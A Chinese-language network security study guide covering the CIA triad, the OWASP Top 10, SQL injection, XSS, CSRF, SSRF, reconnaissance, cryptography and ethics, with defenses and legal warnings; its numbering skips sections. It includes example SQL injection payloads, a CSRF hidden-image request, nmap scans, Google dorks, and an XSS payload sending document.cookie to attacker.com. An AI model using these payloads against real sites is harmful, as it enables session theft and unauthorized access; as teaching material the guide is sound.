# 一、基础概念

## 1.1 什么是网络安全

网络安全（Network Security）指保护网络系统的硬件、软件及数据免受偶然或恶意的破坏、更改、泄露，保障系统连续可靠运行。

**核心目标（CIA 三元组）：**

| 目标 | 说明 | 示例 |
|------|------|------|
| **机密性** Confidentiality | 数据只能被授权方访问 | 加密传输、访问控制 |
| **完整性** Integrity | 数据未被篡改 | 哈希校验、数字签名 |
| **可用性** Availability | 系统按需可访问 | 负载均衡、DDoS防护 |

**扩展（CIA + AAA）：**

- **身份认证（Authentication）** — 验证你是谁
- **授权（Authorization）** — 你能做什么
- **审计（Auditing）** — 记录你做了什么

---

## 1.2 常见安全术语

| 术语 | 说明 |
|------|------|
| **漏洞（Vulnerability）** | 系统本身的缺陷或弱点 |
| **威胁（Threat）** | 可能利用漏洞的人或事物 |
| **风险（Risk）** | 威胁利用漏洞造成损害的可能性 |
| **攻击面（Attack Surface）** | 所有可被攻击的入口点总和 |
| **0Day 漏洞** | 厂商尚未知晓或未修复的漏洞 |
| **Payload** | 攻击中实际执行的恶意代码 |
| **Shellcode** | 用于获取控制权的机器码 |
| **C2 / C&C** | 攻击者控制受害主机的命令通道 |

---

## 1.3 网络基础回顾

### OSI 七层模型

| 层 | 名称 | 协议/设备 | 安全要点 |
|----|------|-----------|----------|
| 7 | 应用层 | HTTP, DNS, SMTP | Web 漏洞、钓鱼 |
| 6 | 表示层 | SSL/TLS | 加密、证书 |
| 5 | 会话层 | NetBIOS, RPC | 会话劫持 |
| 4 | 传输层 | TCP, UDP | 端口扫描、SYN Flood |
| 3 | 网络层 | IP, ICMP | 欺骗、路由攻击 |
| 2 | 链路层 | ARP, MAC | ARP 欺骗、MAC 泛洪 |
| 1 | 物理层 | 网线、WiFi | 物理接入、窃听 |

### TCP/IP 四层模型

```
┌─────────────────┐
│   应用层         │  HTTP, DNS, SSH, FTP
├─────────────────┤
│   传输层         │  TCP（可靠）, UDP（快速）
├─────────────────┤
│   网络层         │  IP（寻址和路由）
├─────────────────┤
│   网络接口层     │  以太网、WiFi
└─────────────────┘
```

**TCP 三次握手（重点）：**

```
Client                    Server
  │                         │
  │────── SYN ────────────→  │  ① 客户端发 SYN
  │←───── SYN+ACK ────────  │  ② 服务端确认并回复
  │────── ACK ────────────→  │  ③ 客户端确认，建立连接
  │                         │
```

> 安全意义：SYN Flood 攻击就是只发①不发③，耗尽服务端资源。

# 二、Web 安全

## 2.1 OWASP Top 10（2021）

最权威的 Web 漏洞排行：

| 排名 | 漏洞 | 说明 |
|------|------|------|
| A01 | **失效的访问控制** | 越权操作、未授权访问 |
| A02 | **加密机制失效** | HTTPS 配置不当、弱加密 |
| A03 | **注入** | SQL/XSS/OS 命令注入 |
| A04 | **不安全的设计** | 架构层面缺乏安全考虑 |
| A05 | **安全配置错误** | 默认密码、目录列出、调试接口 |
| A06 | **易受攻击的组件** | 使用过期的第三方库 |
| A07 | **身份认证失效** | 弱密码、无 MFA、会话固定 |
| A08 | **数据完整性失败** | 反序列化、软件供应链攻击 |
| A09 | **安全日志与监控不足** | 缺乏审计日志 |
| A10 | **SSRF** | 服务端请求伪造 |

## 2.2 SQL 注入（SQLi）

**原理：** 未过滤的用户输入被拼接到 SQL 语句中。

**示例：**

```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = 'pass';

-- 注入后
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
-- 注释掉了密码验证，直接登录 admin
```

**经典注入 payload：**

```sql
' OR 1=1 --
' UNION SELECT username, password FROM users --
admin' --
' OR '1'='1
```

**防御：**

```python
# ❌ 危险 — 字符串拼接
query = f"SELECT * FROM users WHERE id = {user_input}"

# ✅ 安全 — 参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

---

## 2.3 跨站脚本（XSS）

**原理：** 恶意脚本注入到页面中，在受害者浏览器执行。

**三种类型：**

| 类型 | 说明 | 示例 |
|------|------|------|
| **存储型** | 恶意代码存在服务器上 | 评论区写 `<script>alert(1)</script>` |
| **反射型** | 恶意代码在 URL 参数中 | `?search=<script>...</script>` |
| **DOM 型** | 纯前端漏洞 | 通过 URL hash 注入 |

**测试 payload：**

```html
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
<svg onload=alert(1)>
```

**防御：**

```javascript
// 输出到 HTML 时转义特殊字符
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
}
```

## 2.4 跨站请求伪造（CSRF）

**原理：** 受害者已登录某网站，攻击者诱导受害者点击伪造请求。

**示例：**

```html
<!-- 攻击者页面中的隐藏请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
```

**防御：**
- CSRF Token（每次表单请求携带随机 token）
- SameSite Cookie 属性
- 关键操作要求二次确认

---

## 2.5 文件上传漏洞

**危险点：**
- 上传 PHP/JSP/ASP 等可执行脚本
- 文件名包含路径穿越 `../`
- 文件大小限制不足

**防御：**

```python
# ✅ 白名单检查扩展名
ALLOWED_EXTENSIONS = {'.jpg', '.png', '.gif', '.pdf'}

# ✅ 重命名文件
import uuid, os
ext = os.path.splitext(filename)[1].lower()
if ext in ALLOWED_EXTENSIONS:
    safe_name = str(uuid.uuid4()) + ext

# ✅ 文件头校验（防伪造）
with open(file) as f:
    header = f.read(4)
    if header not in [b'\x89PNG', b'GIF8', b'\xff\xd8']:
        reject()
```

---

## 2.6 SSRF（服务端请求伪造）

**原理：** 攻击者利用服务器代为发起请求，访问内部网络。

**危害：**
- 扫描内网 IP 和端口
- 访问云服务元数据接口（AWS `169.254.169.254`）
- 读取本地文件（`file:///etc/passwd`）

**防御：**
- 限制请求目标 IP（禁止内网地址段）
- 禁用不需要的协议（`file://`, `gopher://`）
- 使用白名单域名列表

## 3.1 信息收集

### 被动信息收集

| 手段 | 工具/方法 |
|------|-----------|
| DNS 枚举 | `dig`, `nslookup`, `dnsrecon` |
| 子域名发现 | `subfinder`, `amass`, `Sublist3r` |

| 指纹识别 | `whatweb`, `wappalyzer` |
| 搜索引擎 | Google Dork, Shodan, Censys |

**Nmap 常用命令：**

```bash
nmap -sS -sV -O target.com          # SYN 扫描 + 版本检测 + OS 识别
nmap -p- target.com                 # 全端口扫描（1-65535）
nmap -sC target.com                 # 默认脚本扫描
nmap -sU target.com                 # UDP 扫描
nmap --script=vuln target.com       # 漏洞扫描
```

### Google Hacking（Google Dork）

```text
site:example.com intitle:"index of"    # 目录列表
filetype:sql "INSERT INTO"             # 泄露的 SQL 文件
inurl:php?id=                          # 可能的 SQL 注入点
intitle:"Welcome to" "Webmin"          # 暴露的管理面板
```

## 3.2 常见网络攻击

### DDoS 攻击

| 类型 | 攻击目标 | 常见手段 |
|------|----------|----------|
| 体积型 | 带宽 | UDP Flood, ICMP Flood |
| 协议型 | 设备资源 | SYN Flood, Ping of Death |
| 应用层 | CPU/内存 | HTTP Flood, Slowloris |

**防御：**
- CDN / 云防护（Cloudflare, AWS Shield）
- 限速（Rate Limiting）
- 负载均衡 + 自动扩容
- 防火墙规则过滤异常流量

### 中间人攻击（MITM）

| 攻击方式 | 说明 |
|----------|------|
| ARP 欺骗 | 伪造 ARP 响应，拦截局域网流量 |
| DNS 欺骗 | 伪造 DNS 响应，指向恶意站点 |
| SSL 剥离 | 将 HTTPS 降级为 HTTP |
| WiFi 蜜罐 | 伪造公共 WiFi 窃听流量 |

**防御：**
- 始终使用 HTTPS（HSTS 头）
- 不连接不可信 WiFi
- 使用 VPN
- 开启证书锁定

### 密码攻击

| 类型 | 说明 |
|------|------|
| 暴力破解 | 尝试所有可能组合 |
| 字典攻击 | 使用常用密码列表 |
| 彩虹表 | 预计算的哈希值映射 |
| 撞库 | 用泄露的密码尝试其他网站 |

**防御：**
- 使用长密码（推荐 ≥ 12 位）
- 开启 MFA（多因素认证）
- 密码管理器（Bitwarden, 1Password）
- 服务端：bcrypt/argon2 慢哈希 + salt

# 四、密码学基础

## 4.1 对称加密

**特点：** 加密和解密使用同一密钥。

| 算法 | 密钥长度 | 说明 |
|------|----------|------|
| **AES** | 128/192/256 位 | 当前标准，推荐 AES-256-GCM |
| **ChaCha20** | 256 位 | Google 推荐，TLS 1.3 可选 |
| **3DES** | 168 位 | 已弃用，不安全 |
| **RC4** | 可变 | 已弃用，严重漏洞 |

```bash
# 使用 OpenSSL 进行 AES 加密/解密
echo "敏感信息" | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:密码

openssl enc -aes-256-cbc -d -pbkdf2 -in encrypted.bin -pass pass:密码
```

---

## 4.2 非对称加密

**特点：** 公钥加密，私钥解密。

| 算法 | 用途 | 密钥长度 |
|------|------|----------|
| **RSA** | 加密/数字签名 | 2048/4096 位 |
| **ECC** | 加密/签名 | 256 位 ≈ RSA 3072 |
| **Ed25519** | 数字签名 | 256 位（推荐 SSH 密钥） |
| **DSA** | 数字签名 | 已弃用 |

```bash
# 生成 RSA 密钥对
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# 使用公钥加密
echo "data" | openssl rsautl -encrypt -pubin -inkey public.pem

# SSH 密钥（推荐）
ssh-keygen -t ed25519 -C "your@email.com"
```

---

## 4.3 哈希函数

**特点：** 单向不可逆，定长输出。

| 算法 | 输出长度 | 安全性 |
|------|----------|--------|
| **SHA-256** | 256 位 | ✅ 安全 |
| **SHA-3** | 可变 | ✅ 安全（新一代标准） |
| **MD5** | 128 位 | ❌ 已破解，不可用于安全 |
| **SHA-1** | 160 位 | ❌ 已破解，不推荐 |

```bash
# 文件完整性校验
sha256sum file.iso

# 密码哈希（服务端）
# 推荐使用 bcrypt / argon2 / scrypt
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(12)))"
```

## 4.4 TLS/SSL

**HTTPS 握手过程（TLS 1.3）：**

```
Client                          Server
  │                               │
  │────── Client Hello ──────────→│  支持的密码套件
  │←───── Server Hello ──────────│  选定套件 + 证书
  │←───── 证书 ──────────────────│  服务器公钥证书
  │────── 密钥交换 ─────────────→│  生成预主密钥
  │────── Finished ─────────────→│  加密通信开始
  │←───── Finished ──────────────│
  │══════ 安全通道 ═══════════════│
```

**检查证书：**

```bash
# 查看网站证书信息
openssl s_client -connect example.com:443 -servername example.com

# 测试 TLS 配置
nmap --script ssl-enum-ciphers -p 443 example.com

# 在线测试
# https://www.ssllabs.com/ssltest/
```

## 5.5 漏洞挖掘方法论

### Web 漏洞测试流程

```
① 信息收集
├── 域名/子域名
├── IP 段（CDN 绕过）
├── 端口和服务
├── 目录/文件
├── 技术栈指纹

├── 文件操作（上传/下载/包含）
├── 逻辑漏洞（验证绕过、支付漏洞）
├── SSRF/CSRF/XXE

③ 漏洞验证
├── 确认漏洞存在
├── 确定影响范围
├── 构造 PoC
└── 评估严重性

④ 报告编写
├── 漏洞描述
├── 复现步骤 + 截图
├── 影响分析
├── 修复建议
└── CVSS 评分
```

- **《中华人民共和国个人信息保护法》** （2021）
- **《刑法》第 285/286 条** — 非法侵入计算机信息系统罪

> ⚠️ **未授权的渗透测试 = 违法**
> 即使是"漏洞赏金"也必须在平台规定的范围内操作。
> 
> ✅ 合法的做法：
> - 搭建自己的靶机环境练习
> - 参加授权的 CTF 比赛
> - 在 Bugcrowd / HackerOne 等正规平台挖洞
> - 获得客户书面授权后进行渗透测试

## 6.2 安全从业者道德准则

1. **不造成损害** — 不破坏目标系统
2. **不窃取数据** — 发现的漏洞不用于获取私密信息
3. **守口如瓶** — 未修复的漏洞不公开披露
4. **合法授权** — 只在授权范围内操作
5. **报告优先** — 发现漏洞先通知厂商
6. **持续学习** — 保持技术更新，关注新威胁

# 七、速查表

## HTTP 状态码

| 状态码 | 含义 | 安全意义 |
|--------|------|----------|
| 200 | OK | 正常响应 |
| 301/302 | 重定向 | 可能跳转到恶意域名 |
| 401 | 未授权 | 需要认证 |
| 403 | 禁止 | 访问被拒绝 |
| 404 | 未找到 | 路径不存在 |
| 405 | 方法不允许 | 接口限制 GET/POST |
| 500 | 服务器错误 | 可能暴露内部错误信息 |
| 502/503 | 网关/服务不可用 | 可能被 DDoS 或配置错误 |

## 常见端口

| 端口 | 服务 | 安全关注点 |
|------|------|-----------|
| 21 | FTP | 明文传输，匿名登录 |

| 23 | Telnet | 明文，已弃用 |
| 25 | SMTP | 邮件伪造，开放中继 |

| 143 | IMAP | 明文邮件 |
| 443 | HTTPS | 证书有效性 |
| 445 | SMB | EternalBlue 等漏洞 |
| 1433 | MSSQL | 弱密码 |
| 3306 | MySQL | 弱密码，未授权访问 |
| 3389 | RDP | 暴力破解，BlueKeep |

| 6379 | Redis | 未授权访问 |
| 8080 | HTTP-Proxy | 开放代理 |
| 27017 | MongoDB | 未授权访问 |

## 常用正则

```regex
# IP 地址
\b(?:\d{1,3}\.){3}\d{1,3}\b

# 域名
[a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}

# 邮箱
[\w.-]+@[\w.-]+\.\w{2,}

# URL
https?://[^\s/$.?#].[^\s]*

# 手机号（中国大陆）
1[3-9]\d{9}

# API Key / Token
[A-Za-z0-9_-]{20,64}

# Base64
(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?
```
